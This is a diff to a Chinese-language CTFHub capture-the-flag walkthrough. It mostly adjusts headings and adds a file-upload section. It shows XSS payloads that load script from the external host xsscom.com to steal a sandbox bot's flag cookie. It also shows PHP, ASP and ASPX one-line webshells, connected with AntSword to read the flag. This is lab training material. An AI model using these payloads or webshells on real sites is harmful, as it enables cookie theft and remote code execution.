@@ -1254,7 +1254,7 @@ ctfhub{f90b6c76f97124cd83e38e9b}
 利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。
 
 > #### What's your name 后的输入框填写 CTFHub 点击Submit
-#### Send URL to Bot中URL后的输入框填写`http://challenge-f218d4eec3b4f897.sandbox.ctfhub.com:10800/?name=</textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Send
+Send URL to Bot中URL后的输入框填写`http://challenge-f218d4eec3b4f897.sandbox.ctfhub.com:10800/?name=</textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Send
 
 在接收到的内容中能看到`cookie : flag=ctfhub{c7f04cd9f2e9912994ba8f6b}`，提交即可。
 
@@ -1265,7 +1265,7 @@ ctfhub{f90b6c76f97124cd83e38e9b}
 利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。
 
 > #### What's your name 后的输入框填写 `</textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Submit
-#### Send URL to Bot中URL后的输入框填写`http://challenge-c41534fe7b97ead5.sandbox.ctfhub.com:10800/?name=</textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Send
+Send URL to Bot中URL后的输入框填写`http://challenge-c41534fe7b97ead5.sandbox.ctfhub.com:10800/?name=</textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Send
 
 在接收到的内容中能看到`cookie : flag=ctfhub{3815ce26ba81106c87aeafb2}`，提交即可。
 
@@ -1342,7 +1342,7 @@ ctfhub{f90b6c76f97124cd83e38e9b}
 
 ------
 
-### 动态加载器
+#### 动态加载器
 
 打开靶机后看到以下页面：
 
@@ -1418,5 +1418,42 @@ lrwxrwxrwx 1 root root 32 Jan 14  2018 /lib64/ld-linux-x86-64.so.2 -> /lib/x86_6
 (www-data:/var/www/html) $ /lib64/ld-linux-x86-64.so.2 /readflag
 ctfhub{de2eb2419998c06d2a75733f}
 ```
+
+------
+
+### 文件上传
+
+#### 无验证
+
+编写`PHP`一句话木马，并上传文件。
+
+```php
+<?php @eval($_POST['t0ur1st']); ?>
+```
+
+上传成功后可以看到靶机显示：
+
+> 上传文件相对路径
+> upload/6.php
+
+类似的一句话木马还有：
+
+```asp
+<%eval request("t0ur1st")%>
+```
+
+```aspx
+<%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
+```
+
+通过`AntSword`连接靶机的`webshell`并打开终端，
+
+```bash
+$ find / -name flag*
+$ cat flag_2492722517.php
+<?php // ctfhub{ebfc397b4ed065684160083d}
+```
+
+提交`ctfhub{ebfc397b4ed065684160083d}`即可。
 
 ------
